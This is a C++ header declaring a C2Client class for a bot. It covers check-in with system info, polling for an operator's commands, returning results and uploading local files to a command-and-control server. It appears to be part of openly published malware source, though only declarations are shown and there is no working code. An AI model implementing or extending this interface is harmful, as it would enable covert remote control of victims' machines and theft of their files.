/*
MIT License
Copyright (c) 2020 4B4DB4B3
*/

#pragma once
#ifndef C2CLIENT_H
#define C2CLIENT_H

#include "Requests.h"

class C2Client {
private:
    char*       c2_host;
    char*       auth_key;
    int         bot_id;
public:
    C2Client(char* host, char* auth, int id)
        : c2_host(host), auth_key(auth), bot_id(id) {}

    // Send initial check-in with system info
    void        Checkin(const char* info);

    // Send a command result back to the operator
    void        SendResult(const char* data);

    // Poll for a pending command; returns "" if none queued
    std::string GetPendingCommand();

    // Upload a local file to the C2 server; returns server-assigned filename or "" on failure
    std::string UploadFile(const char* localFilePath);

    // Fire-and-forget: POST a structured telemetry event JSON to /event
    void SendEvent(const char* json_body);
};

#endif
